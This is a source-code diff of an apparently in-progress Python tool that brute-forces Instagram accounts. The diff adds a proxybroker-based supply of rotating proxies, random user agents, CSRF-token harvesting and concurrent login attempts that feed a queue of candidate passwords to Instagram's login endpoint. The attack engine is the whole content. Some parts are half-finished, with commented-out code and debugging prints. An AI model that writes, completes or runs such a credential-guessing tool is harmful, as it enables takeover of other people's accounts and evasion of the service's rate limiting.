@@ -5,13 +5,16 @@ import logging.config
 
 import aiohttp
 import asyncio
+import random
 import signal
+from proxybroker import Broker
 
 from app import settings
 
 from app.lib import exceptions
 from app.lib.logging import AppLogger
-from app.lib.sessions import InstagramSession, ProxySession
+from app.lib.models import InstagramResult
+from app.lib.sessions import InstagramSession
 from app.lib.users import User
 from app.lib.utils import (auto_logger, get_token_from_cookies,
     get_token_from_response, get_cookies_from_response)
@@ -29,152 +32,243 @@ class Engine(object):
         '_test_attack_sync': 'Test Sync Attack',
         '_attack_sync': 'Synchronous Attack',
         '_attack_asnc': 'Asynchronous Attack',
-        'consume_passwords': 'Login with Proxy',
-        'populate_proxies': 'Populating Proxies',
+        'consume_passwords': 'Logging In',
+        'test_consume_passwords': 'Logging In',
         'populate_passwords': 'Populating Passwords',
-        'get_tokens': 'Fetching Tokens',
-        'get_cookies': 'Fetching Cookies',
+        'get_proxy_tokens': 'Fetching Tokens',
         'consume_attempts': 'Storing Attempted Password',
     }
 
     def __init__(self, username):
         self.user = User(username)
+
         logging.setLoggerClass(AppLogger)
         self.log = logging.getLogger(self.__loggers__['__base__'])
 
 
 class ExceptionHandler(object):
 
-    def _handle_api_exception(self, exc):
-        if getattr(exc, 'proxy', None) is None:
-            raise RuntimeError(
-                f"Exception {exc.__class__.__name__} was not assigned "
-                "a proxy."
-            )
+    async def exception_handler(self, coro, loop):
+        try:
+            await coro
+        except Exception as e:
+            self.log.info('from handler')
+            self.log.error(str(e))
+            loop.stop()
 
+    async def shutdown(self, signal, loop):
+
+        self.log.info(f'Received exit signal {signal.name}...')
+        tasks = [t for t in asyncio.all_tasks() if t is not
+            asyncio.current_task()]
+
+        [task.cancel() for task in tasks]
+
+        self.log.info('Canceling outstanding tasks...')
+        await asyncio.gather(*tasks)
+
+        loop.stop()
+        self.log.success('Shutdown complete.')
+
+    def _handle_api_exception(self, fut, exc, log):
         if isinstance(exc, exceptions.BadProxyException):
-            self.proxy_list.remove(exc.proxy)
-            self.log.warn(str(exc))
+            log.info(exc.message, extra={
+                'task': fut,
+                'proxy': fut.proxy,
+            })
         else:
-            self.log.error(str(exc))
+            log.warning(exc.message, extra={
+                'task': fut,
+                'proxy': fut.proxy,
+            })
 
-    def _handle_app_exception(self, exc):
+    def _handle_app_exception(self, fut, exc, log):
         if isinstance(exc, exceptions.ApiException):
-            self._handle_api_exception(exc)
+            self._handle_api_exception(fut, exc, log)
         else:
             raise exc
 
-    def _handle_response_exception(self, exc):
+    def _handle_response_exception(self, fut, exc, log):
         if isinstance(exc, exceptions.InstagramAttackException):
-            self._handle_app_exception(exc)
+            self._handle_app_exception(fut, exc, log)
         else:
-            self.log.error(str(exc))
-            #raise exc
+            raise exc
+            # log.error(exc.__class__.__name__, extra={
+            #     'task': fut,
+            #     'proxy': fut.proxy,
+            # })
+
+
+class EnginePasswordMixin(ExceptionHandler):
+
+    @auto_logger(show_running=False)
+    async def test_consume_passwords(self, loop, response, log):
+
+        stop_event = asyncio.Event()
+
+        def callback(fut):
+            exc = fut.exception()
+            if exc:
+                raise exc
+                # self._handle_response_exception(fut, exc, log)
+                self.log.error(exc.__class__.__name__, extra={'proxy': fut.proxy})
+            elif not fut.result():
+                # Right now, logging is done in sessions and we are returning None
+                # if server error found.
+                # If we stop the logging in sessions and raise the exceptions
+                # direction in the session, we should raise a RuntimeError here.
+                log.warning("The coroutine did not contain a result.")
+            else:
+                response = fut.result()
+                log.success('got result')
+                log.success(response)
+
+                result = InstagramResult.from_dict(response)
+                if result.accessed:
+                    log.success("Authenticated", extra={'proxy': fut.proxy})
+                else:
+                    log.error('Not Authenticated', extra={'proxy': fut.proxy})
+
+        async def bound_login(sem, session, username, password, token, proxy):
+            # async with sem:
+            log.info('Attempting Login', extra={
+                'proxy': proxy,
+            })
+            async with session.post(
+                settings.INSTAGRAM_LOGIN_URL,
+                proxy=f"http://{proxy.host}:{proxy.port}/",
+                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
+                json={
+                    'username': username,
+                    'password': password
+                },
+            ) as response:
+                # response = await self._handle_response(response)
+                # import ipdb; ipdb.set_trace()
+                return await response.json()
+                # return await session.login(username, password, token, proxy)
+
+        tasks = []
+        sem = asyncio.Semaphore(5)
+
+        connector = aiohttp.TCPConnector(ssl=False)
+        headers = settings.HEADER.copy()
+        headers['user-agent'] = random.choice(settings.USER_AGENTS)
+        headers['x-csrftoken'] = token
+        cookies = {'x-csrftoken': token}
+        async with aiohttp.ClientSession(headers=headers, connector=connector, cookies=cookies) as session:
+            # For the test, we already have a password.  We just have to try
+            # until we get valid results.
+            # while not stop_event.is_set():
+            for i in range(5):
+                proxy = await self.proxies.get()
+                if not proxy:
+                    continue
+
+                task = asyncio.create_task(bound_login(
+                    sem,
+                    session,
+                    self.user.username,
+                    self.password,
+                    token,
+                    proxy
+                ))
+
+                task.name = f"Login Task {len(tasks) - 1}"
+                task.proxy = proxy
+                task.token = token
+
+                task.add_done_callback(callback)
+                tasks.append(task)
+
+            responses = await asyncio.gather(*tasks, return_exceptions=True)
+
+        results = []
+        for resp in responses:
+            if not isinstance(resp, Exception):
+                result = InstagramResult.from_dict(resp)
+                results.append(result)
+        return results
 
 
 class EngineProxyMixin(ExceptionHandler):
 
-    def base_response_callback(self, fut):
-        exc = fut.exception()
-        if exc:
-            self._handle_response_exception(exc)
-        else:
-            if not fut.result():
-                raise RuntimeError(
-                    "Futures should not be returning a null result, an "
-                    "exception should be raised before this happens."
-                )
-            return fut.result()
+    @auto_logger(show_running=False)
+    async def get_proxy_tokens(self, loop, log):
 
-    def token_callback(self, fut):
-        results = self.base_response_callback(fut)
-        if results:
-            proxy, response = results
-            try:
-                token = get_token_from_response(response, proxy=proxy, strict=True)
-            except exceptions.TokenNotInResponse as exc:
-                self.proxy_list.remove(proxy)
-                self.log.error(str(exc))
+        stop_event = asyncio.Event()
+
+        def callback(fut):
+            exc = fut.exception()
+            if exc:
+                self._handle_response_exception(fut, exc, log)
+            elif not fut.result():
+                # Right now, logging is done in sessions and we are returning None
+                # if server error found.
+                # If we stop the logging in sessions and raise the exceptions
+                # direction in the session, we should raise a RuntimeError here.
+                log.warning("The coroutine did not contain a result.")
+                pass
             else:
-                self.good_proxies.append(proxy)
-                self.log.success("Received token %s." % token, extra={
-                    'proxy': proxy
+                response = fut.result()
+                token = get_token_from_response(response)
+                if token:
+                    log.warning("Got token, setting stop event.", extra={
+                        'proxy': fut.proxy,
+                        'status_code': response.status,
+                        'task': fut,
+                    })
+                    stop_event.set()
+                else:
+                    log.warning("Token was not in response.", extra={
+                        'proxy': fut.proxy,
+                        'status_code': response.status,
+                        'task': fut,
+                    })
+
+        tasks = []
+        async with InstagramSession() as session:
+            while not stop_event.is_set():
+                proxy = await self.proxies.get()
+                if not proxy:
+                    continue
+
+                task = asyncio.ensure_future(session.fetch(proxy))
+
+                task.name = f"Task {len(tasks) - 1}"
+                task.proxy = proxy
+                log.info("Got proxy", extra={
+                    'proxy': proxy,
+                    'task': task,
                 })
 
-    def cookies_callback(self, fut):
-        results = self.base_response_callback(fut)
-        if results:
-            proxy, response = results
-            try:
-                get_cookies_from_response(response)
-            except exceptions.CookiesNotInResponse as e:
-                self.proxy_list.remove(proxy)
-                self.log.error(e)
-            else:
-                self.good_proxies.append(proxy)
-                self.log.success("Received cookies.", extra={
-                    'proxy': proxy
-                })
+                task.add_done_callback(callback)
+                tasks.append(task)
 
-    async def get_proxy_responses(self, loop, log, callback, as_cookies=False, as_token=True):
+            responses = await asyncio.gather(*tasks, return_exceptions=True)
 
-        async def get_responses():
-            tasks = []
-            async with InstagramSession() as session:
-                for i in range(len(self.proxy_list[:20])):
-                    proxy = self.proxy_list[i]
-                    task = asyncio.ensure_future(session.get_base_response(
-                        proxy,
-                        as_cookies=as_cookies,
-                        as_token=as_token,
-                    ))
-                    task.add_done_callback(callback)
-                    tasks.append(task)
-
-                    # TODO: Use Logging ContextFilter to add contextual information
-                    # for specific task.
-                    task.name = f"Task {i} for Proxy {proxy.ip}"
-
-                return await asyncio.gather(*tasks, return_exceptions=True)
-
-        async def filter_responses(results):
-            filtered = []
-            for result in results:
-                if not isinstance(result, Exception):
-                    filtered.append(result)
-            return filtered
+        async def filter_out_tokens(responses):
+            # Some responses may be None because we are logging instead of raising in Session.
+            tokens = []
+            for response in responses:
+                # Because we are currently logging with exception catching in
+                # the session, we can wind up with null responses.
+                if not isinstance(response, Exception) and response is not None:
+                    token = get_token_from_response(response)
+                    if token:
+                        result = self.test_consume_passwords(loop, response)
+                        print(result)
+                    tokens.append(response)
+            return tokens
 
         # We do this 20 concurrent requests at a time, but there is a chance that
         # all of the proxies are bad, so we would have to keep going.
         # TODO: Use a semaphore.
-        results = []
-        while not results:
-            results = await get_responses()
-
-        return await filter_responses(results)
-
-    @auto_logger(show_running=False)
-    async def get_cookies(self, loop, log):
-        results = await self.get_proxy_responses(loop, log, self.cookies_callback,
-            as_cookies=True, as_token=False)
-        return [(proxy, response.cookies) for proxy, response in results]
-
-    @auto_logger(show_running=False)
-    async def get_tokens(self, loop, log):
-        """
-        Returns a list of tokens based on 20 concurrent requests to the Instagram
-        API.  On average, it returns about 6-7 tokens, which we will use as fallbacks
-        in case we need them when requests fail for token related reasons.
-
-        The higher the value of TOKEN_REQUEST_LIMIT (i.e. the number of
-        concurrent requests to retrieve a token), the slighly longer this process
-        takes, but the more bad proxies we can rule out from the get go.
-        """
-        return await self.get_proxy_responses(loop, log, self.token_callback,
-            as_cookies=False, as_token=True)
+        # responses = await get_responses()
+        return await filter_out_tokens(responses)
 
 
-class EngineAsync(Engine, EngineProxyMixin):
+class EngineAsync(Engine, EngineProxyMixin, EnginePasswordMixin):
 
     def __init__(self, username, mode='async', test=False, password=None):
         super(EngineAsync, self).__init__(username)
@@ -188,12 +282,12 @@ class EngineAsync(Engine, EngineProxyMixin):
         self.test = test
         self.password = password  # Used for Testing
 
-        self.stop_event = asyncio.Event()
         self.passwords = asyncio.Queue()
         self.attempts = asyncio.Queue()
 
-        self.proxy_list = []
-        self.good_proxies = []
+        self.proxies = asyncio.Queue()
+
+        self.broker = Broker(self.proxies, timeout=6, max_conn=200, max_tries=1)
 
         self.option_handler = {
             ('async', False): self._attack_async,
@@ -217,38 +311,6 @@ class EngineAsync(Engine, EngineProxyMixin):
         log.info(f"Populated {self.passwords.qsize()} Passwords")
 
     @auto_logger
-    async def populate_proxies(self, loop, log):
-        """
-        Retrieves proxies by using the ProxyApi to scrape links defined
-        in settings.  Each returned response is parsed and converted into
-        a list of Proxy objects.
-        """
-        def callback(fut):
-            result = fut.result()
-            for proxy in result:
-                if proxy not in self.proxy_list:
-                    self.proxy_list.append(proxy)
-
-        tasks = []
-        async with ProxySession() as session:
-            for url in settings.PROXY_LINKS:
-                log.info(f"Scraping Proxies at {url}")
-                task = asyncio.ensure_future(session.get_proxies(
-                    url,
-                ))
-                tasks.append(task)
-                task.add_done_callback(callback)
-
-            log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
-            task = asyncio.ensure_future(session.get_extra_proxies())
-            tasks.append(task)
-            task.add_done_callback(callback)
-
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-        log.info(f"Populated {len(self.proxy_list)} Proxies")
-
-    @auto_logger
     async def _attack_async(self, loop, log):
         """
         Right now, we are not going to wrap this in handle_exceptions
@@ -263,22 +325,15 @@ class EngineAsync(Engine, EngineProxyMixin):
 
     @auto_logger
     async def _test_attack_async(self, loop, log):
+        # Find a way to make the consumption of passwords start immediately when
+        # the first token is found, by setting self.token and having a hold
+        # in the consume passwords task until self.token is set.
+        tokens = await self.get_proxy_tokens(loop)
+        if None in tokens:
+            raise RuntimeError("Should not have None value for a token.")
 
-        async def get_login_results(results, limit=20):
-            async with InstagramSession() as session:
-                tasks = []
-                for proxy, cookies in results:
-                    token = get_token_from_cookies(cookies)
-                    task = asyncio.ensure_future(session.login(
-                        self.user.username, self.password, token, proxy
-                    ))
-                    task.add_done_callback(self.base_response_callback)
-                    tasks.append(task)
-                return await asyncio.gather(*tasks, return_exceptions=True)
-
-        results = await asyncio.ensure_future(self.get_cookies(loop))
-        responses = await get_login_results(results)
-        print(responses)
+        # await self.exception_handler(self.test_consume_passwords(loop, tokens[0]), loop)
+        await self.test_consume_passwords(loop, tokens[0])
 
     @auto_logger
     async def _attack_sync(self, loop, log):
@@ -315,26 +370,30 @@ class EngineAsync(Engine, EngineProxyMixin):
                 s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))
 
         try:
-            prep_tasks = (
+            await self.exception_handler(self.populate_passwords(loop), loop)
+
+            types = ['HTTP']
+            tasks = [
+                self.broker.find(types=types),
                 loop.create_task(
-                    self.handle_exception(
-                        self.populate_proxies(loop), loop
-                    )
-                ),
-                loop.create_task(
-                    self.handle_exception(
-                        self.populate_passwords(loop), loop
-                    )
+                    self.option_handler[(self.mode, self.test)](loop),
                 )
-            )
-
-            await asyncio.gather(*prep_tasks)
-
-            attacker = self.option_handler[(self.mode, self.test)]
-            await attacker(loop)
+            ]
+            await asyncio.gather(*tasks)
 
         finally:
             self.log.info('Cleaning up')
+            tasks = [t for t in asyncio.all_tasks() if t is not
+            asyncio.current_task()]
+
+            [task.cancel() for task in tasks]
+
+            self.log.info('Canceling outstanding tasks...')
+            await asyncio.gather(*tasks)
+
+            loop.stop()
+            self.log.success('Shutdown complete.')
+
             loop.stop()
 
     @auto_logger(show_running=False)
@@ -350,12 +409,8 @@ class EngineAsync(Engine, EngineProxyMixin):
                     self.user.add_password_attempt(attempt)
 
     @auto_logger(show_running=False)
-    async def consume_passwords(self, tokens, loop, log):
-        """
-        Right now, we are going to try with only one token.  If we start running
-        into issues, we can incorporate functionality to use backup tokesn if
-        available.
-        """
+    async def consume_passwords(self, loop, token, log):
+
         def callback(fut):
             log.success(fut.result())
             exc = fut.exception()
@@ -383,24 +438,23 @@ class EngineAsync(Engine, EngineProxyMixin):
                 log.success(f"Authenticated!")
                 self.stop_event.set()
 
-        async def bound_login(sem, session, username, password, token, use_proxy):
-            print("Waiting for sem")
-            async with sem:
-                print("FETCHING")
-                await session.login(username, password, token, use_proxy)
+        # async def bound_login(sem, session, username, password, token, use_proxy):
+        #     print("Waiting for sem")
+        #     async with sem:
+        #         print("FETCHING")
+        #         await session.login(username, password, token, use_proxy)
 
-        async def login_with_passwords(queue, token):
+        async def login_with_token(self, loop, token):
             tasks = []
-            sem = asyncio.Semaphore(5)
+            # sem = asyncio.Semaphore(5)
 
             async with InstagramSession() as session:
                 # We might have to remove the queue.empty() check if we are going
                 # to put passwords back in if there is a failure with the proxy.
                 # while not self.stop_event.is_set() and not queue.empty():
-                for i in range(20):
-                    use_proxy = self.proxy_list[i]
+                while not self.passwords.empty():
                     try:
-                        password = queue.get_nowait()
+                        password = await self.passwords.get()
                     except asyncio.QueueEmpty:
                         continue
                     else:
@@ -496,27 +550,3 @@ class EngineAsync(Engine, EngineProxyMixin):
         #             tasks.append(task)
 
         #         await asyncio.gather(*tasks, return_exceptions=True)
-
-    async def handle_exception(self, coro, loop):
-        """
-        This does not seem to be working properly for all situations.
-        """
-        try:
-            await coro
-        except Exception as e:
-            self.log.error(str(e))
-            loop.stop()
-
-    async def shutdown(self, signal, loop):
-
-        self.log.info(f'Received exit signal {signal.name}...')
-        tasks = [t for t in asyncio.all_tasks() if t is not
-            asyncio.current_task()]
-
-        [task.cancel() for task in tasks]
-
-        self.log.info('Canceling outstanding tasks...')
-        await asyncio.gather(*tasks)
-
-        loop.stop()
-        self.log.success('Shutdown complete.')
